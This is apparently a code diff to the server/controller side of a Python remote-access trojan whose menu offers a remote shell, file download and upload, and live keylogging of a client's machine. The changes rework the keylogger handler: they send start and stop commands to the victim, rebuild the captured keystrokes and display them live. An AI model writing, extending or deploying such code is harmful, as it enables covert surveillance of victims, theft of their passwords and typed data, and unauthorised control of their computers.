@@ -1,6 +1,8 @@
 import os
 import socket, threading, time
 import sys
+import signal
+from xml.dom import IndexSizeErr
 
 SERVER_ADDR = "127.0.0.1"
 SERVER_PORT = 8080
@@ -166,7 +168,7 @@ def client_console(cmd):
                     \n\tUse 'shell' to gain a shell on the client's machine \
                     \n\tUse 'dl' to download a file.\
                     \n\tUse 'ul' to upload a file.\
-                    \n\tUse 'keylogger' to start a live keylog of the clients machine.")
+                    \n\tUse 'keylogger' to start a live keylog of the clients machine. \n")
             elif "exit" in newCMD:
                 break
             else:
@@ -174,26 +176,48 @@ def client_console(cmd):
     except Exception as e:
         print("Invalid use of command! \n" + str(e))
 
+#Used to break keylogger with ctrl-z
+def ctrlC(signum, frame):
+    raise KeyboardInterrupt
+
 def start_keylog(cmd,conn):
-    print("Keylogger starting... Use ctrl+c to end logging.")
+    signal.signal(signal.SIGTSTP, ctrlC)
+    signal.signal(signal.SIGTERM, ctrlC)
+    print("Keylogger starting...\nIMPORTANT:\nUse ctrl+z & ctrl+c to end logging.")
     conn.send("START_KEYL0GGER".encode())
     try:
         log = ''
         print()
         while True:
             out = conn.recv(BUFFER_SIZE).decode()
-            sys.stdout.flush()
-            if out == "BACKSPACE":
-                log = log[:-1]
-            elif out == "ENTER":
+            os.system('cls' if os.name == 'nt' else 'clear') #Clear the screen. Use cls on Windows or clear on Unix
+            if out == "BACKSPACE": #If the user hit backspace, delete one keystroke from the string
+                try:
+                    if log[len(log)-1] == ")": #check if the last char is a ), it might be a Key.
+                        i = len(log)-1 #Set i = length of the log - 1
+                        while(log[i]) != "(": #Iterate backwards until we find a (
+                            i-=1
+                        print(log[i:i+4])
+                        if log[i:i+4] == "(Key": #If the string is '(Key' then we found a key to delete
+                            log = log[:i]
+                        else:
+                            log = log[:-1]
+                    else:
+                        log = log[:-1] #If the last char isn't a ), then just delete one char
+                except IndexError:
+                    log = log[:-1] + ' ' #If index out of bounds, just delete one and add a space
+            elif out == "ENTER": #If the user hit enter, make a new line
                 log += "\n"
             else:
                 log += out
+            print("Keylogger in progress...\nUse ctrl+z & ctrl+c to end logging.\n")
             print(f"{log}",end="\r")
 
     except KeyboardInterrupt:
+        os.system('cls' if os.name == 'nt' else 'clear') #Clear the screen. Use cls on Windows or clear on Unix
         conn.send("KEY_L0GGER-END".encode())
-        print("Keylogger ending...\nReturning to main menu.")
+        print("Keylogger ending... Returning to client menu.")
+        
 
 def download_file(cmd,conn):
     try:
